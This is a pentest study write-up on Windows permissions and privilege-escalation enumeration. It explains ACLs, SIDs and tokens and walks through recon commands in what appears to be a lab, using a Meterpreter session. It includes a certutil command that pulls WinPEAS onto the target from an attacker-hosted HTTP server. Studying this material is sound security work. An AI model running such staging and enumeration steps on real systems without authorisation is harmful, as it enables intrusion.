<h1 align="center"> Windows Permissions </h1>


<img width="1536" height="1024" alt="Windows Permissions" src="https://github.com/user-attachments/assets/4449d992-ea03-44d4-9abc-be380d0b26a2" />


---

## Content Table:

[Introduction to Windows Permissions](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#introduction-to-windows-permisions)

  - [What is Windows Permisions?](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#what-is-windows-permisions)
  - [Windows permissions apply to many objects](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#windows-permissions-apply-to-many-objects)
  - [Users, Groups, and Security Principals](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#users-groups-and-security-principals)
  - [Permission Types (What Actions Are Allowed)](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#permission-types-what-actions-are-allowed)
  - [NTFS Permissions (Core Concept)](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#ntfs-permissions-core-concept)
  - [Access Control Entries (ACE)](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#access-control-entries-ace)
  - [Authentication, Authorization and Session Management](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#authentication-authorization-and-session-management)
  - [Security Principals and Security Identifier (SID)](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#security-principals-and-security-identifier-sid)
  - [SID Structure](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#sid-structure)


[Windows Permissions Methodology](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#windows-permissions-methodology)

  1. [Understanding Windows Users & Groups](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#1-understanding-windows-users--groups)
  2. [Windows Permission Types](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#2-windows-permission-types)
  3. [Checking Your Current Permissions](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#3-checking-your-current-permissions)
  4. [Common Permission Vulnerabilities](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#4-common-permission-vulnerabilities)
  5. [Access Token](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#5-access-token)
  6. [Exploitation Technique](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#6exploitation-technique)
      1. [Enumeration](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#1-enumeration)
      2. [Check for Writeable Directories](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#2-check-for-writeable-directories)
      3. [Check Services](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#3-check-services)
      4. [Check Scheduled Tasks](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#4-check-scheduled-tasks)
      5. [Check installed Applications](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#5-check-installed-applications)
      6. [Check Privileges](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#6-check-privileges)
  7. [ Automated Tools](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#7-automated-tools)
      1.  [WinPEAS](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#1-winpeas)
      2.  [PowerUp.ps1](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#2-powerupps1)
  8. [Final Note](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#8-final-note)
  9. [Cheat Sheet](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/04.%20Windows_Permissions.md#9-cheat-sheet)
  
---



# Introduction to Windows Permisions

## What is Windows Permisions?
Windows permissions control:
- **Who** can access a resource
- **What** actions they can perform
- **On which object** (file, folder, registry, service, process)
> Think of permissions as rules that protect Windows resources.


## Windows permissions apply to many objects:
| Object Type     | Example                  |
| --------------- | ------------------------ |
| Files           | `C:\Users\user\file.txt` |
| Folders         | `C:\Program Files\`      |
| Registry Keys   | `HKLM\Software`          |
| Services        | Windows Update           |
| Processes       | `lsass.exe`              |
| Scheduled Tasks | Backup task              |


## Users, Groups, and Security Principals
Permissions are assigned to Security Principals:
- Users:
  - Administrator
  - User1

- Groups (VERY IMPORTANT)
  - Administrators
  - Users
  - Authenticated Users
  - SYSTEM
  - Everyone



## Permission Types (What Actions Are Allowed)

### File & Folder Permissions
| Permission   | Meaning            |
| ------------ | ------------------ |
| Read         | View file contents |
| Write        | Modify file        |
| Execute      | Run file           |
| Modify       | Read + Write       |
| Full Control | All permissions    |


### Registry Permissions
| Permission    | Meaning            |
| ------------- | ------------------ |
| Query Value   | Read registry data |
| Set Value     | Change data        |
| Create Subkey | Add new keys       |
| Full Control  | All actions        |


### Service Permissions
Services also have permissions:
- Start
- Stop
- Change config
- Delete



## NTFS Permissions (Core Concept)
Windows uses NTFS to enforce permissions.

- Each object has:
  - Owner
  - Access Control List (ACL)

- ACL contains:
  - `DACL`: Who is allowed/denied
  - `SACL`: What actions are audite


## Access Control Entries (ACE)
An ACL is made of ACEs:
| ACE Type | Meaning       |
| -------- | ------------- |
| Allow    | Permit action |
| Deny     | Block action  |




## Authentication, Authorization and Session Management
- **Authentication** → Who you are
Verifies user identity (login with password, OTP, biometrics).

- **Authorization** → What you can do
Controls permissions and access (admin vs user).

- **Session Management** → How are information regarding the identity of the user stored and processedwhile a user is having an authentication sessions. How the system remembers you
Keeps you logged in using sessions/cookies.

- Order: `Authentication → Session Management → Authorization`
| Concept            | Question                | Example       |
| ------------------ | ----------------------- | ------------- |
| Authentication     | Who are you?            | Login         |
| Authorization      | What can you do?        | Admin vs User |
| Session Management | How are you remembered? | Cookies       |




## Security Principals and Security Identifier (SID)
**Security principals** can represent any entity that can be authenticated by the operating system.

### Security Principals
- A security principal is any entity that can be authenticated by Windows.
- This includes:
  - User accounts (e.g., user, Administrator)
  - Computer accounts (e.g., domain-joined machines)
  - Processes or threads (e.g., services running under specific identities


A **security identifier** is used to uniquely identify a security principal or security group.
SID → Security Identifier

Security Principals
- A SID is a unique string that identifies a security principal.
- It looks like this: `S-1-5-21-3623811015-3361044348-30300820-1013`
- Windows uses SIDs internally to manage permissions, not usernames.
- Even if you rename a user, their SID stays the same — that’s how Windows knows it’s the same entity.



- Examples of security principals:
  - user account
  - computer account
  - thread or process
The SID cannot be changed and is generated upon the user or group's creation.


> SID: Are used by Windows to identify security principles for access control management (authorization controls).



## SID Structure
A SID is a unique identifier used by Windows to represent a security principal (user, group, computer, etc.). It’s made up of several parts:
````
S-R-X-Y1-Y2-...-Yn
````
| Segment        | Meaning                                                                                        |
| -------------- | ---------------------------------------------------------------------------------------------- |
| **S**          | Indicates this is a Security Identifier (SID) string. Always starts with `S`.                  |
| **R**          | Revision number of the SID format. Usually `1`.                                                |
| **X**          | Identifier Authority — specifies who issued the SID (e.g., NT Authority, domain controller).   |
| **Y1 to Yn-1** | Subauthorities — identify the domain or local computer that created the account.               |
| **Yn**         | Relative Identifier (RID) — uniquely identifies the specific user or group within that domain. |



### Enumeration SIDs
Obtain the SID for the current logged-in user:
````
whoami /user
````
<img width="578" height="152" alt="image" src="https://github.com/user-attachments/assets/d286d416-60f4-452a-8828-b07e55d5c09b" />

- `S`: Indicates this is a SID string
- `1`: Revision number
- `5`: Identifier authority (NT Authority)
- `21-1598086677-3833633028-2215134970`: Domain Identifier (unique to your machine/domain)
- `1001`: Relative Identifier (RID) → identifies the specific user account (k4n0ng



- We can Enumerate SIDs with the `wmic` command:
````
wmic useraccount get domain, name, sid
````
<img width="733" height="154" alt="image" src="https://github.com/user-attachments/assets/76ef4066-794f-4092-bd68-f7eb96c89878" />

- **Domain Identifier**: `S-1-5-21-1598086677-3833633028-2215134970`
  - This part is common across all accounts on your machine. It uniquely identifies your computer/domain.
- Relative Identifier (RID): The last number in each SID, unique per account:
  - `500`: Built‑in **Administrator**
  - `501`: Built‑in **Guest**
  - `503`: **DefaultAccount** (system account)
  - `504`: **WDAGUtilityAccount** (Windows Defender Application Guard)
  - `1001`: Our custom user account **k4n0ng**


- we can view this website: https://learn.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-well_known_sid_type


---









# Windows Permissions Methodology
First in this if we got `meterpreter` -> get one more `shell`:
````
shell
````
<img width="504" height="189" alt="image" src="https://github.com/user-attachments/assets/06416f71-efa6-4ba7-b59e-de0e9ad5c74a" />

- Now we got targe `Shell`.

---

## 1. Understanding Windows Users & Groups

### Built-in Local Groups:
| Group Name                          | Description                                                                       |
| ----------------------------------- | --------------------------------------------------------------------------------- |
| **Administrators**                  | Full system control; can install software, change settings, and manage all users. |
| **Users**                           | Standard users with limited permissions for daily tasks.                          |
| **Guests**                          | Very limited access; typically disabled by default.                               |
| **Backup Operators**                | Can back up and restore files regardless of file permissions.                     |
| **Power Users**                     | Legacy group from older Windows versions; mostly deprecated.                      |
| **Network Configuration Operators** | Can manage network settings (IP, adapters) without full admin rights.             |
| **Remote Desktop Users**            | Allowed to log in remotely using Remote Desktop (RDP).                            |



### Built-in System Accounts:
| Account             | Description                                                                                     |
| ------------------- | ----------------------------------------------------------------------------------------------- |
| **SYSTEM**          | Has the highest privileges on the local system; used by core Windows services.                  |
| **Local Service**   | Runs services with very limited local privileges and uses anonymous credentials on the network. |
| **Network Service** | Runs services with limited local privileges but uses the computer’s credentials on the network. |


### Check our Current User & Groups:
````
whoami
````
<img width="273" height="82" alt="image" src="https://github.com/user-attachments/assets/33ca74b0-d699-4fa6-8fc9-8cff715b75f6" />


````
whoami /groups
````
<img width="1427" height="412" alt="image" src="https://github.com/user-attachments/assets/ac7f17b8-e601-4e35-bc23-4a319f8a1bda" />

- Displays all `groups` that the current user belongs to.
- Shows `SIDs`, `attributes`, and `privileges` associated with those groups.



````
whoami /priv
````
<img width="1110" height="627" alt="image" src="https://github.com/user-attachments/assets/b089710e-b3af-46c6-87c3-7aa4961352ac" />


````
net user
````
<img width="750" height="198" alt="image" src="https://github.com/user-attachments/assets/23de6a8b-2584-4e99-b13f-71a47d847591" />

````
net localgroup
````
<img width="738" height="520" alt="image" src="https://github.com/user-attachments/assets/54a51b65-6484-4b81-8014-3dec217aec51" />

````
net user k4n0ng
````
<img width="528" height="537" alt="image" src="https://github.com/user-attachments/assets/c08a3366-68b2-4cdd-a15f-f4bb6cdc4b98" />


---




## 2. Windows Permission Types

### Basic Permissions:
| Permission | Meaning        |
| ---------- | -------------- |
| **F**      | Full Control   |
| **M**      | Modify         |
| **RX**     | Read & Execute |
| **R**      | Read           |
| **W**      | Write          |



### Advanced Permissions (NTFS):
````
icacls C:\Users\k4n0ng
````
<img width="579" height="148" alt="image" src="https://github.com/user-attachments/assets/f24a2f2f-5f71-4985-b5f5-ba150684218b" />

- Shows the ACL (Access Control List) for that folder.
- Explain about it:
#### Standard Permissions
##### Read / Execute Permissions
| Permission                         | Description                                                                          |
| ---------------------------------- | ------------------------------------------------------------------------------------ |
| **Traverse Folder / Execute File** | Traverse folders to reach files even without list permission; execute program files. |
| **List Folder / Read Data**        | View folder contents; open and read file data.                                       |
| **Read Attributes**                | View basic file attributes (read-only, hidden, etc.).                                |
| **Read Extended Attributes**       | View custom attributes defined by applications.                                      |

##### Write Permissions
| Permission                       | Description                                                                    |
| -------------------------------- | ------------------------------------------------------------------------------ |
| **Create Files / Write Data**    | Create new files; write data to existing files.                                |
| **Create Folders / Append Data** | Create subfolders; append data to a file without overwriting existing content. |
| **Write Attributes**             | Modify basic file attributes (hidden, read-only, etc.).                        |
| **Write Extended Attributes**    | Modify custom application-defined attributes.                                  |

##### Delete Permissions
| Permission                      | Description                                                 |
| ------------------------------- | ----------------------------------------------------------- |
| **Delete Subfolders and Files** | Delete items inside a folder even if you are not the owner. |
| **Delete**                      | Delete the file or folder itself.                           |


##### Advanced Control Permissions
| Permission             | Description                                                 |
| ---------------------- | ----------------------------------------------------------- |
| **Read Permissions**   | View the Access Control List (ACL).                         |
| **Change Permissions** | Modify permissions (grant or revoke access).                |
| **Take Ownership**     | Take ownership of the object, overriding the current owner. |



### Special Privileges (User Rights):
| Privilege Name                    | Description                                                             |
| --------------------------------- | ----------------------------------------------------------------------- |
| **SeBackupPrivilege**             | Allows backing up files and directories, bypassing file permissions.    |
| **SeRestorePrivilege**            | Allows restoring files and directories, bypassing file permissions.     |
| **SeDebugPrivilege**              | Allows debugging and accessing any process, including system processes. |
| **SeImpersonatePrivilege**        | Allows impersonating another user after successful authentication.      |
| **SeAssignPrimaryTokenPrivilege** | Allows replacing a process-level security token.                        |
| **SeLoadDriverPrivilege**         | Allows loading and unloading device drivers.                            |
| **SeTakeOwnershipPrivilege**      | Allows taking ownership of files, folders, and other objects.           |
| **SeTcbPrivilege**                | Allows acting as part of the operating system (Trusted Computing Base). |


---



## 3. Checking Your Current Permissions

### Check User Privileges:
````
whoami /priv
````
<img width="1110" height="627" alt="image" src="https://github.com/user-attachments/assets/b089710e-b3af-46c6-87c3-7aa4961352ac" />


### Check File/Folder Permissions:
````
icacls "C:\Users\k4n0ng"
````
<img width="549" height="162" alt="image" src="https://github.com/user-attachments/assets/1c552025-16d8-4c38-8ac2-00f002d13db1" />

- Recursive:
````
icacls "C:\Users\k4n0ng\Helo" /T
````
<img width="667" height="561" alt="image" src="https://github.com/user-attachments/assets/69c71a19-5401-425e-8c0e-1a3685f56e5a" />


### Check Service Permissions:
````
sc.exe qc wuauserv
````
<img width="737" height="295" alt="image" src="https://github.com/user-attachments/assets/fc94aa18-a8b6-4133-b329-ba827e6f331d" />

- After run this command:
````
Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\wuauserv" | Format-List
````
<img width="880" height="123" alt="image" src="https://github.com/user-attachments/assets/7b23a3a4-b342-4a46-a25a-8b2b000d7021" />

- But in this it not recognized, cause we run on `CMD`. To fix it we need to run this command on `Powershell`:

<img width="1560" height="218" alt="image" src="https://github.com/user-attachments/assets/2c8d1ec5-1cc7-45a1-85ab-96ea775d6d1e" />

- **Owner**: SYSTEM
- **Admins & SYSTEM**: FullControl
- **Users & App Packages**: Read-only
- **Risk**: Secure - no write access for low-privilege users.



### Check Registry Permissions:
````
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
````
<img width="757" height="120" alt="image" src="https://github.com/user-attachments/assets/d288aa23-7296-43f2-b442-46ffb7fa3a2c" />

- Our reg query command ran successfully — but it didn’t show any output because there are no values currently set under:
````
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
````
That key is where Windows stores startup programs (apps that auto-launch when the system boots). If it’s empty, it simply means no applications are registered there right now.


- Next command but run as PowerShell:
````
Get-Acl -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | Format-List
````
<img width="1798" height="302" alt="image" src="https://github.com/user-attachments/assets/36ffda3f-288e-46d3-9130-3df9c45e488d" />

- **Owner / Group**: SYSTEM
- **Admins & SYSTEM**: FullControl (expected)
- **Users & App Packages**: Read-only (safe)
- **Extra entries** (numeric flags like `-2147483648`, `268435456`): These are internal registry rights constants — they don’t represent dangerous write access for normal users.


---



## 4. Common Permission Vulnerabilities

### Weak File/Folder Permissions
- World-writable directories (Everyone:(F))
- Weak permissions on executables (Users:(M))
- Weak permissions on configuration files


### Weak Service Permissions
- Services running as SYSTEM with weak binary permissions
- Unquoted service paths with spaces
- Service allowing non-admin to modify configuration

### Weak Registry Permissions
- Registry keys with Everyone:(F)
- Auto-run keys writable by non-admins
- PATH directory modifiable by users


### Scheduled Tasks with Weak Permissions
- Tasks running as high privilege with weak executable permissions
- Tasks writable by non-admin users


---




## 5. Access Token
Upon user authentication, Windows generates an access token and assigns it to the user.
This token contains data that determines the security context of the user and is later used for performing authorization checks.


### Information Contained in an Access Token:
| **Category**                      | **Description**                                                                                                                     |
| --------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| **User SID**                      | Security Identifier (SID) for the user’s account.                                                                                   |
| **Group SIDs**                    | SIDs for all groups the user is a member of.                                                                                        |
| **Logon SID**                     | Identifies the current logon session.                                                                                               |
| **Privileges**                    | List of privileges held by the user or their groups (e.g., `SeDebugPrivilege`).                                                     |
| **Owner SID**                     | SID of the owner of the token (typically the user).                                                                                 |
| **Primary Group SID**             | SID of the user’s primary group.                                                                                                    |
| **Default DACL**                  | Default Discretionary Access Control List applied when the user creates a new securable object.                                     |
| **Token Source**                  | Indicates where the token originated (e.g., local logon, network logon).                                                            |
| **Token Type**                    | Specifies whether it’s a **primary token** (for launching processes) or **impersonation token** (for temporary identity switching). |
| **Restricting SIDs** *(Optional)* | Optional list of SIDs that further restrict access beyond normal group membership.                                                  |
| **Impersonation Level**           | Current impersonation level (e.g., Anonymous, Identify, Impersonate, Delegate).                                                     |
| **Other Statistics**              | Additional metadata like token expiration, session ID, etc.                                                                         |



---



## 6.Exploitation Technique

### 1. Enumeration

#### Basic system info 
````
systeminfo
````
<img width="870" height="659" alt="image" src="https://github.com/user-attachments/assets/60dc5c0c-740d-4460-9861-d9c87eeafe33" />

<img width="1025" height="409" alt="image" src="https://github.com/user-attachments/assets/2fe9c226-deb0-4e32-9399-b59b80d09c3b" />

- Now we see detail about target system.
- When you run it in Command Prompt (CMD) or PowerShell, it outputs things like:
  - **OS details**: Name, version, build number, install date
  - **System manufacturer/model**: Hardware vendor and product name
  - **Processor info**: CPU type and speed
  - **BIOS version**
  - **Memory**: Total physical RAM, available RAM, virtual memory
  - **Network configuration**: Hostname, domain, logon server
  - **Hotfixes/updates**: List of installed patches


````
hostname
````
<img width="260" height="76" alt="image" src="https://github.com/user-attachments/assets/aac1e788-d9ba-476b-91a6-1dcbcf6e8bc4" />

- In this I see the target **Hostname** is `DESKTOP-PNITAG8`.



#### User info
````
whoami /all
````
<img width="1418" height="559" alt="image" src="https://github.com/user-attachments/assets/913682f3-3c7f-471f-91f0-5919165b7889" />

<img width="1113" height="594" alt="image" src="https://github.com/user-attachments/assets/a394db0f-4d1a-4e6f-8811-c5b783eaba85" />


````
net user %username%
````
<img width="502" height="547" alt="image" src="https://github.com/user-attachments/assets/5aecf2aa-bfcd-48b5-8ed0-b482e7827d9e" />

This command will show:
- Full name
- Account active status
- Password settings (last set, expiration, required)
- Group memberships
- Profile path, logon script, etc
- This command is used to display detailed information about the currently logged‑in user account.




````
net localgroup administrators
````
<img width="856" height="242" alt="image" src="https://github.com/user-attachments/assets/c01aebf5-b818-4e55-a0c8-519a03be08a1" />

- Shows which users have administrator privileges on the system.
- Helps system admins and security auditors quickly check who can perform elevated tasks (install software, change system settings, manage other users).
- This command is used to list all the accounts that belong to the local Administrators group on your computer.




#### Network info 
````
ipconfig /all
````
<img width="799" height="611" alt="image" src="https://github.com/user-attachments/assets/ea17330a-bbc0-4e15-a494-63270c6d785b" />

This command will shows detailed network configuration for all adapters:
- Hostname
- DNS servers
- DHCP status
- IP address, subnet mask, default gateway
- MAC address (Physical Address)
- Lease information (when DHCP gave you the IP)




````
netstat -ano
````
<img width="734" height="794" alt="image" src="https://github.com/user-attachments/assets/c980518a-68f3-4432-a213-d0f5fbfac839" />

<img width="824" height="607" alt="image" src="https://github.com/user-attachments/assets/89e682ff-dee4-4b0e-afd2-2ac6cc0b15b0" />

- This command is a powerful network diagnostic tool.
- netstat shows active network connections and listening ports.
- The flags `-a`, `-n`, and `-o` modify the output:
  - `-a`: Displays all connections and listening ports (TCP + UDP).
  - `-n`: Shows addresses and port numbers in **numeric form** (instead of resolving hostnames).
  - `-o`: Adds the **Process ID (PID)** that owns each connection.




#### Running processes
````
tasklist /svc
````
<img width="759" height="778" alt="image" src="https://github.com/user-attachments/assets/e6d0abc4-6a02-405b-9672-89adb9a41e0a" />

- This command is used to display all running processes **along with the services** that are hosted inside them.
- `tasklist`: shows all active processes (like Task Manager in text form).
- `/svc`: adds a column listing the Windows services running inside each process.
This is especially useful because many services don’t appear as separate processes - they’re hosted inside `svchost.exe`.



#### Installed software
````
wmic product get name,version
````
<img width="829" height="236" alt="image" src="https://github.com/user-attachments/assets/729b7a66-1fc2-4903-ad66-6251319ea7c8" />

- `wmic`: Windows Management Instrumentation Command‑line. It lets you query system information.
- `product`: Refers to installed applications registered with Windows Installer (MSI).
- `get name,version`: Retrieves the software name and its version.


### 2. Check for Writeable Directories
#### Check PATH directories
````
echo %PATH%
````
<img width="271" height="84" alt="image" src="https://github.com/user-attachments/assets/f31e1cda-9232-46da-a815-5fb89c75c46d" />



#### Check common writable directories
````
icacls "C:\ProgramData"
icacls "C:\Windows\Temp"
icacls "C:\Users\Public"
````
<img width="673" height="672" alt="image" src="https://github.com/user-attachments/assets/8923cf43-5472-4593-8586-32fc8827607e" />

- `(F)`: Full Control
- `(RX)`: REad & Execute
- `(W)`: Write


- And to get `PowerShell` on `meterpreter`:
````
load powershell
powershell_shell
````
<img width="403" height="121" alt="image" src="https://github.com/user-attachments/assets/69a7e31b-dad1-4436-817d-dc5a54b4e0f2" />

- Now we can write something like `PowerShell`.

- Or we can use it in `PowerShell`:
````
Get-WmiObject -Class Win32_Product | Select-Object Name, Version
````
<img width="737" height="243" alt="image" src="https://github.com/user-attachments/assets/a8c38494-7386-43c9-b14f-a9c866cc4265" />

- Now we see the output is the same above.

- Or fast:
````
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion
````
<img width="1110" height="289" alt="image" src="https://github.com/user-attachments/assets/fdebdc4f-fee3-4d16-a10e-9855c92dc3ad" />



### 3. Check Services

#### List all services
````
sc query state= all
````
<img width="728" height="772" alt="image" src="https://github.com/user-attachments/assets/0ab5c965-5f30-4aa0-a8c4-c17d0fba0dd0" />


- This command is used to query the Service Control Manager (SCM) and list all services on the system, regardless of their current state.
- `sc`: Service Control utility. It manages Windows services (start, stop, query, configure).
- `query`: Asks for information about services.
- `state= all`: Means “show all services,” not just running ones.






#### Check specific service permissions
- In thiswe can use with `Service_name` above, And in this I used with `dhcp`.
````
accesschk.exe -ucqv Dhcp
````
````
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
````
<img width="645" height="98" alt="image" src="https://github.com/user-attachments/assets/7b1beec5-98ac-42d0-9783-f7c591604855" />

- But `accesschk.exe` i not yet to install it, also i don't install it. IF we want to install it:

1. Download AccessChk
- Get it from Microsoft’s official Sysinternals site: https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
- It comes as a standalone `.exe` or inside the full Sysinternals Suite.
2. Extract it
- Place `accesschk.exe` in a folder, e.g., `C:\Sysinternals`.
3. Run it directly:
- Navigate to the folder:
````
cd C:\Sysinternals
accesschk.exe -ucqv Dhcp
````
- - Or run with full path:
````
C:\Sysinternals\accesschk.exe -ucqv Dhcp
````
- But in this I don't show demo.






### 4. Check Scheduled Tasks

#### List all tasks
````
schtasks /query /fo LIST /v
````
<img width="1911" height="645" alt="image" src="https://github.com/user-attachments/assets/0743d448-50b2-480f-b531-a16f26d2c656" />


#### Export to file for analysis
````
schtasks /query /fo CSV > tasks.csv
````
<img width="644" height="604" alt="image" src="https://github.com/user-attachments/assets/4d15bb03-9100-45c8-b3a9-aa60f3ad2573" />


- To check it:
````
type tasks.csv
````
<img width="1312" height="796" alt="image" src="https://github.com/user-attachments/assets/50ce2d53-ee10-40ae-8f7c-7a004c8ceb5c" />





### 5. Check installed Applications

#### Look for vulnerable software
````
wmic product get name,version
````
<img width="770" height="230" alt="image" src="https://github.com/user-attachments/assets/d0798288-2453-42ac-bf16-19c7c7aade4a" />

- This command queries Windows Management Instrumentation (WMI) for all software products installed via Windows Installer (MSI) and shows their name and version.
- **Inventory**: Lists installed applications and their versions.
- **Troubleshooting**: Helps check if the right version of a dependency (like Visual C++ runtimes) is present.
- **Security auditing**: Spot outdated or unauthorized software.
- **Documentation**: Useful for creating system reports in labs or portfolios.



#### Check application directories
````
dir "C:\Program Files" /s /b | findstr /i "old backup temp"
````
<img width="1919" height="587" alt="image" src="https://github.com/user-attachments/assets/14f65b5f-6728-411a-a543-5d6c3973a8d0" />

- `dir "C:\Program Files"`:
  - Lists the contents of `C:\Program Files`.
- `/s`:
  - Recursively includes all subdirectories.
- `/b`:
  - Uses bare format (just full paths, no headers or extra info).
- `| findstr /i "old backup temp"`:
  - Pipes the output into `findstr`.
  - `/i`: case‑insensitive search.
  - Looks for any path containing the words old, backup, or temp.





### 6. Check Privileges
- Check for dangerous privileges
````
whoami /priv | findstr /i "SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege SeImpersonatePrivilege SeLoadDriverPrivilege SeTcbPrivilege"
````
<img width="1499" height="153" alt="image" src="https://github.com/user-attachments/assets/3d05eba9-07a6-4e59-a5be-b09b65aa79c3" />


---






## 7. Automated Tools

### 1. WinPEAS

#### Download WinPEAS:
- Go to this source: https://github.com/carlospolop/PEASS-ng
<img width="1918" height="1022" alt="image" src="https://github.com/user-attachments/assets/4f9c0a42-25e4-448a-b882-4648f0def4ca" />

- In this first I want to create one folder:
````
mkdir ~/winpeas && cd ~/winpeas
````
<img width="359" height="126" alt="image" src="https://github.com/user-attachments/assets/01d6f71b-2297-4495-819c-f6206a0e6806" />


- Download direct the lates windPEAS executable
````
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe
````
<img width="1915" height="654" alt="image" src="https://github.com/user-attachments/assets/43b73f3a-8577-4ab4-a9c2-b058266edc85" />

- Now we was download the winpeas file.


- Verify
````
ls -l winPEASany.exe
````
<img width="624" height="76" alt="image" src="https://github.com/user-attachments/assets/24545f3c-2c25-4cd2-8af3-b277a1ef5cbb" />

- Now we see our file.


##### After I host a ssimple HTTP Server on kali:
- Start an HTTP server in the same directory:
````
python3 -m http.server 8080
````
<img width="594" height="118" alt="image" src="https://github.com/user-attachments/assets/205054fd-d151-4ede-b5c3-8160293a61ac" />


- After back to our windows.


##### On Windows:
````
certutil -urlcache -f http://192.168.127.128:8080/winPEASany.exe winpeas.exe
````
<img width="917" height="109" alt="image" src="https://github.com/user-attachments/assets/b8b9b60d-dd00-4a13-8fb2-a4bbeffd8d6d" />

- Now we successfully to download.


##### Run Winpeas
````
winpeas.exe
````
<img width="1919" height="800" alt="image" src="https://github.com/user-attachments/assets/ad1720d0-4b94-4200-bc72-3b5db668f2dd" />

<img width="1338" height="577" alt="image" src="https://github.com/user-attachments/assets/46ef8e23-9dc8-4b78-b97e-d5ea0cb7eaa8" />

<img width="1708" height="715" alt="image" src="https://github.com/user-attachments/assets/def91dd7-ff25-4f4a-b800-7af80ad0ffe3" />

<img width="1557" height="719" alt="image" src="https://github.com/user-attachments/assets/ff34c395-232b-476d-a438-b55051e02c80" />

<img width="1708" height="761" alt="image" src="https://github.com/user-attachments/assets/b3160842-ab0d-4bcf-aff5-864fe8e0636f" />

